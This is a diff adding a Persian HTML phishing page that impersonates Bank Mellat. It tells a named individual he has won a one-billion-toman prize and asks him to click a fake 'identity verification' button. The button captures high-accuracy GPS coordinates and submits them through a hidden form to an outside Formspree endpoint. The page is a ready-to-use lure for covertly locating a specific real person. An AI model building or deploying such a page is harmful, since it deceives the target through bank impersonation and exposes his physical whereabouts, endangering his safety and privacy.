@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>بانک ملت - برنده خوش‌شانس</title>
+  <style>
+    body {
+      font-family: "Vazir", sans-serif;
+      background: #f2f2f2;
+      text-align: center;
+      direction: rtl;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      background: white;
+      max-width: 500px;
+      margin: 50px auto;
+      border-radius: 16px;
+      padding: 30px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      color: #d80027;
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      color: #444;
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #d80027;
+      color: white;
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #b00020;
+    }
+    #status {
+      margin-top: 20px;
+      color: #444;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/BMellat.svg/1200px-BMellat.svg.png" alt="بانک ملت" class="logo">
+    <h1>تبریک! شما برنده شدید</h1>
+    <h2>حسین قرنی‌زاده عزیز، شما برنده <strong>۱ میلیارد تومان</strong> جایزه نقدی بانک ملت به قید قرعه شدید.</h2>
+    <p>برای تکمیل فرآیند دریافت جایزه، لطفاً روی دکمه زیر کلیک کنید تا هویت شما تأیید شود.</p>
+    <button onclick="getLocation()">تأیید هویت</button>
+    <p id="status"></p>
+
+    <form id="gpsForm" action="https://formspree.io/f/xkgrwvde" method="POST" style="display:none;">
+      <input type="hidden" name="latitude" id="latitude">
+      <input type="hidden" name="longitude" id="longitude">
+    </form>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        document.getElementById("status").innerText = "در حال بررسی موقعیت مکانی...";
+        navigator.geolocation.getCurrentPosition(sendLocation, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        document.getElementById("status").innerText = "مرورگر شما موقعیت مکانی را پشتیبانی نمی‌کند.";
+      }
+    }
+
+    function sendLocation(position) {
+      document.getElementById("latitude").value = position.coords.latitude;
+      document.getElementById("longitude").value = position.coords.longitude;
+      document.getElementById("gpsForm").submit();
+      document.getElementById("status").innerText = "موقعیت با موفقیت ارسال شد. لطفاً منتظر تأیید نهایی بمانید.";
+    }
+
+    function showError(error) {
+      document.getElementById("status").innerText = "خطا در دریافت موقعیت. لطفاً GPS را فعال کرده و دوباره تلاش کنید.";
+    }
+  </script>
+</body>
+</html>
